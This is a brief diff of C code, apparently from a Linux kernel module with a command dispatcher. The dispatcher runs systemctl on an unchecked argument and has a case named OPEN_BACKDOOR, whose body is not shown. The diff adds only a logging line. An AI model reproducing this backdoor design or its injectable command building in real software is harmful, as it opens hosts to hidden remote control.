@@ -16,10 +16,12 @@ typedef enum COMMANDS {
 static int execute_and_get_status(command_t type, char *argument){
     char command[128] = {0};
     int ret;
+
     
     switch(type){
         case START_SERVICE:
         case STOP_SERVICE:
+            pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stop", argument);
             snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
             break;
         case OPEN_BACKDOOR:
